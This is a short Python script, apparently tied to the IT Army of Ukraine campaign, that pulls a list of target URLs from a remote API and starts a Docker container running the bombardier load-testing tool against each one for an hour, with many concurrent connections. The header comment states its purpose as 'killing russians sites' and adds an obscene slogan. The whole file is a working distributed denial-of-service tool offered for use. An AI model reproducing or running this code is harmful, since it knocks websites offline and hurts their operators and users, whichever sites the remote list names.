# This is a simple Python script for killing russians sites.
# Ruskii korabl idi nahuy
import requests
import json
import docker
from settings import *

if __name__ == '__main__':
    urls = json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)

    client = docker.from_env()
    for url in urls:
        cont = client.containers.run("alpine/bombardier:latest", f'-c {CONNECTIONS} -d 3600s -l {url}', detach=True)
        print(cont.logs())

